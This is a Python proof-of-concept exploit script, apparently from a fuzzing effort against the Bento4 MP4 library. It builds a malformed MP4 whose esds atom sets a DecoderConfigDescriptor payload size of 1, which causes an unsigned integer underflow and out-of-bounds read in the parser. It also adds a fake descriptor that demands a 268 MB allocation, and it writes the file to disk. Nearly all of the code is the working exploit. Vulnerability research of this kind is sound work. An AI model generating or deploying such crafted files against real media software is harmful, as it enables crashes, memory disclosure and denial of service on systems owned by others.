#!/usr/bin/env python3
"""
PoC for AP4_DecoderConfigDescriptor Integer Underflow -> OOB Read
Vulnerability: Ap4DecoderConfigDescriptor.cpp line 92
  AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);

When payload_size=1 (< 13), unsigned subtraction wraps:
  1 - 13 = 0xFFFFFFF4 (huge SubStream size -> reads past declared boundary)

Trigger path:
  mp42aac -> AP4_File -> moov/trak/mdia/stsd/mp4a -> esds
  -> AP4_EsdsAtom -> AP4_DescriptorFactory -> AP4_EsDescriptor
  -> AP4_DescriptorFactory -> AP4_DecoderConfigDescriptor (line 92)

Extra bytes after DC payload form a fake AP4_DecoderSpecificInfoDescriptor
with payload_size=0x0FFFFFFF (268MB), triggering a huge allocation attempt.
"""

import struct
import os

POC_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Descriptor_h/'
OUTPUT_FILE = os.path.join(POC_DIR, 'vuln_001.mp4')

# ---------------------------------------------------------------------------
# Helper: build ISO BMFF box  (size[4] + type[4] + payload)
# ---------------------------------------------------------------------------
def make_box(box_type, payload):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I4s', size, box_type) + payload

# ---------------------------------------------------------------------------
# Helper: build ISO BMFF FullBox  (size[4] + type[4] + version+flags[4] + payload)
# ---------------------------------------------------------------------------
def make_fullbox(box_type, version, flags, payload):
    full_payload = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + payload
    return make_box(box_type, full_payload)

# ---------------------------------------------------------------------------
# Helper: MPEG-4 expandable class size encoding
# ---------------------------------------------------------------------------
def encode_expandable_size(n):
    """Encode integer n as MPEG-4 expandable class size (up to 4 bytes)."""
    if n < 128:
        return bytes([n])
    groups = []
    tmp = n
    while tmp > 0:
        groups.append(tmp & 0x7F)
        tmp >>= 7
    groups.reverse()
    result = bytearray()
    for i, g in enumerate(groups):
        if i < len(groups) - 1:
            result.append(g | 0x80)   # more-bit set
        else:
            result.append(g)          # last byte, no more-bit
    return bytes(result)

# ===========================================================================
# Craft the malicious esds atom
# ===========================================================================
#
# ES_Descriptor payload layout inside the ES child SubStream (8 bytes):
#
#   [0] 0x04  DecoderConfigDescriptor tag
#   [1] 0x01  payload_size = 1 (triggers underflow at line 92!)
#   [2] 0x80  1 byte of DC payload
#   [3] 0x05  fake AP4_DecoderSpecificInfoDescriptor tag
#   [4] 0xFF  expandable size byte 1 (more-bit set, 7 payload bits = 0x7F)
#   [5] 0xFF  expandable size byte 2
#   [6] 0xFF  expandable size byte 3
#   [7] 0x7F  expandable size byte 4 (last, no more-bit)
#              => payload_size = 0x0FFFFFFF (268 MB allocation attempt)
#
# The DC constructor (line 92) computes:
#   payload_size - 13  =  1 - 13  =  0xFFFFFFF4  (unsigned wraparound!)
# and creates AP4_SubStream(..., start+13, 0xFFFFFFF4).
#
# After the DC constructor returns, the normal ES child descriptor loop
# parses bytes [3..7] as a DecoderSpecificInfoDescriptor with
# payload_size=0x0FFFFFFF, triggering a 268 MB heap allocation.
# ===========================================================================

# DecoderConfigDescriptor: tag(0x04) + size(0x01=1 byte) + 1-byte payload
dc_payload  = bytes([0x80])                                 # 1 byte of garbage
dc_desc     = bytes([0x04]) + encode_expandable_size(1) + dc_payload   # 3 bytes

# Fake descriptor bytes (parsed by the normal ES loop OR by the underflowed
# SubStream if the SubStream is large enough to reach them)
# tag=0x05 (AP4_DESCRIPTOR_TAG_DECODER_SPECIFIC_INFO), size=0x0FFFFFFF
fake_tag    = bytes([0x05])
fake_size   = bytes([0xFF, 0xFF, 0xFF, 0x7F])   # expandable 0x0FFFFFFF
extra_bytes = fake_tag + fake_size               # 5 bytes

# ES_Descriptor payload: ES_ID(2) + stream_priority(1) + DC_desc(3) + extra(5) = 11 bytes
es_payload  = struct.pack('>HB', 1, 0)          # ES_ID=1, stream_priority=0
es_payload += dc_desc
es_payload += extra_bytes

# ES_Descriptor: tag=0x03, size=11
es_desc = bytes([0x03]) + encode_expandable_size(len(es_payload)) + es_payload

# esds box: version+flags(4) + ES_Descriptor(13) = 17 bytes content
esds_content = struct.pack('>I', 0) + es_desc   # version+flags = 0
esds_box     = make_box(b'esds', esds_content)  # 8 + 17 = 25 bytes

# ===========================================================================
# mp4a sample entry
# ===========================================================================
mp4a_payload  = bytes(6)                                # reserved
mp4a_payload += struct.pack('>H', 1)                    # data_reference_index = 1
mp4a_payload += bytes(8)                                # AudioSampleEntry reserved
mp4a_payload += struct.pack('>HH', 2, 16)              # channelcount=2, samplesize=16
mp4a_payload += struct.pack('>HH', 0, 0)               # pre_defined=0, reserved=0
mp4a_payload += struct.pack('>I', 44100 << 16)         # samplerate 44100.0 (16.16)
mp4a_payload += esds_box
mp4a_box = make_box(b'mp4a', mp4a_payload)             # 8+28+25 = 61 bytes

# ===========================================================================
# stbl sub-boxes
# ===========================================================================
# stsd (sample description)
stsd_content = struct.pack('>I', 1) + mp4a_box         # entry_count=1 + mp4a(61)
stsd_box     = make_fullbox(b'stsd', 0, 0, stsd_content)  # 12+4+61 = 77 bytes

# stts (time-to-sample): 1 entry: count=1, delta=1000
stts_content = struct.pack('>I',  1) + struct.pack('>II', 1, 1000)
stts_box     = make_fullbox(b'stts', 0, 0, stts_content)  # 24 bytes

# stsc (sample-to-chunk): 1 entry
stsc_content = struct.pack('>I', 1) + struct.pack('>III', 1, 1, 1)
stsc_box     = make_fullbox(b'stsc', 0, 0, stsc_content)  # 28 bytes

# stsz (sample sizes): uniform_size=0, count=1, entry[0]=4
stsz_content = struct.pack('>II', 0, 1) + struct.pack('>I', 4)
stsz_box     = make_fullbox(b'stsz', 0, 0, stsz_content)  # 24 bytes

# ===========================================================================
# Compute mdat offset so stco can reference it
#
# Layout:  ftyp(24) | moov(530) | mdat_header(8) | mdat_data(4)
#
# Computed sizes:
#   ftyp  = 24
#   mvhd  = 108
#   tkhd  = 92
#   mdhd  = 32
#   hdlr  = 33
#   stbl  = 8 + stsd(77) + stts(24) + stsc(28) + stsz(24) + stco(20) = 181
#   minf  = 8 + smhd(16) + dinf(36) + stbl(181) = 241
#   mdia  = 8 + mdhd(32) + hdlr(33) + minf(241) = 314
#   trak  = 8 + tkhd(92) + mdia(314) = 414
#   moov  = 8 + mvhd(108) + trak(414) = 530
#   mdat data offset = 24 + 530 + 8 = 562
# ===========================================================================
MDAT_DATA_OFFSET = 562

# stco (chunk offsets): 1 entry pointing to mdat data
stco_content = struct.pack('>I', 1) + struct.pack('>I', MDAT_DATA_OFFSET)
stco_box     = make_fullbox(b'stco', 0, 0, stco_content)  # 20 bytes

stbl_box = make_box(b'stbl',
                    stsd_box + stts_box + stsc_box + stsz_box + stco_box)  # 8+173=181

# ===========================================================================
# minf
# ===========================================================================
# smhd: 8 bytes of zeros as payload (version+flags=4, balance=2, reserved=2)
smhd_box = make_fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))   # 16 bytes

# dinf / dref / url  (self-contained data reference)
url_box      = make_fullbox(b'url ', 0, 1, b'')                     # 12 bytes
dref_content = struct.pack('>I', 1) + url_box
dref_box     = make_fullbox(b'dref', 0, 0, dref_content)            # 28 bytes
dinf_box     = make_box(b'dinf', dref_box)                          # 36 bytes

minf_box = make_box(b'minf', smhd_box + dinf_box + stbl_box)        # 8+233=241

# ===========================================================================
# mdia
# ===========================================================================
# mdhd (version 0): creation(4)+modification(4)+timescale(4)+duration(4)+language(2)+pre_defined(2)
mdhd_content = struct.pack('>IIII', 0, 0, 1000, 1000)
mdhd_content += struct.pack('>HH', 0x55c4, 0)      # language='und', pre_defined=0
mdhd_box = make_fullbox(b'mdhd', 0, 0, mdhd_content)               # 32 bytes

# hdlr: pre_defined(4)+handler_type(4)+reserved(12)+name(1)
hdlr_content  = struct.pack('>I', 0)                # pre_defined
hdlr_content += b'soun'                             # handler_type
hdlr_content += bytes(12)                           # reserved
hdlr_content += b'\x00'                            # name (null terminator)
hdlr_box = make_fullbox(b'hdlr', 0, 0, hdlr_content)               # 33 bytes

mdia_box = make_box(b'mdia', mdhd_box + hdlr_box + minf_box)       # 8+306=314

# ===========================================================================
# trak
# ===========================================================================
UNITY_MATRIX = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

# tkhd (version 0, flags=3: track_enabled | track_in_movie)
tkhd_content  = struct.pack('>IIIII', 0, 0, 1, 0, 1000)  # creat,mod,track_id,reserved,duration
tkhd_content += bytes(8)                                  # reserved[2]
tkhd_content += struct.pack('>HHHH', 0, 0, 0x0100, 0)   # layer,alt_group,volume,reserved
tkhd_content += UNITY_MATRIX
tkhd_content += struct.pack('>II', 0, 0)                 # width, height
tkhd_box = make_fullbox(b'tkhd', 0, 3, tkhd_content)                # 92 bytes

trak_box = make_box(b'trak', tkhd_box + mdia_box)                   # 8+406=414

# ===========================================================================
# moov
# ===========================================================================
# mvhd (version 0)
mvhd_content  = struct.pack('>IIIII', 0, 0, 1000, 1000, 0x00010000)  # creat,mod,timescale,duration,rate
mvhd_content += struct.pack('>H', 0x0100)   # volume=1.0
mvhd_content += bytes(10)                   # reserved (2 + 8)
mvhd_content += UNITY_MATRIX
mvhd_content += bytes(24)                   # pre_defined
mvhd_content += struct.pack('>I', 2)        # next_track_id
mvhd_box = make_fullbox(b'mvhd', 0, 0, mvhd_content)                # 108 bytes

moov_box = make_box(b'moov', mvhd_box + trak_box)                    # 8+522=530

# ===========================================================================
# ftyp
# ===========================================================================
ftyp_box = make_box(b'ftyp',
    b'isom' + struct.pack('>I', 0) + b'isom' + b'mp41')             # 24 bytes

# ===========================================================================
# mdat  (4 bytes of dummy audio data)
# ===========================================================================
mdat_box = make_box(b'mdat', bytes(4))                               # 12 bytes

# ===========================================================================
# Assemble and write the MP4 file
# ===========================================================================
mp4_data = ftyp_box + moov_box + mdat_box

# Sanity-check computed sizes
assert len(ftyp_box) == 24,  f"ftyp size mismatch: {len(ftyp_box)}"
assert len(moov_box) == 530, f"moov size mismatch: {len(moov_box)}"
assert len(mdat_box) == 12,  f"mdat size mismatch: {len(mdat_box)}"
assert len(ftyp_box) + len(moov_box) + 8 == MDAT_DATA_OFFSET, \
    f"mdat data offset mismatch: {len(ftyp_box) + len(moov_box) + 8} != {MDAT_DATA_OFFSET}"

print(f"[*] MP4 total size : {len(mp4_data)} bytes")
print(f"[*] ftyp           : {len(ftyp_box)} bytes")
print(f"[*] moov           : {len(moov_box)} bytes")
print(f"[*] mdat           : {len(mdat_box)} bytes  (data offset={MDAT_DATA_OFFSET})")
print(f"[*] esds_box       : {len(esds_box)} bytes")
print(f"[*] es_payload     : {len(es_payload)} bytes")
print(f"[*] dc payload_size: 1  (triggers 1-13=0xFFFFFFF4 underflow at line 92)")
print(f"[*] fake DSI size  : 0x{0x0FFFFFFF:08X}  (268 MB allocation attempt)")

os.makedirs(POC_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    f.write(mp4_data)
print(f"[+] Written to: {OUTPUT_FILE}")
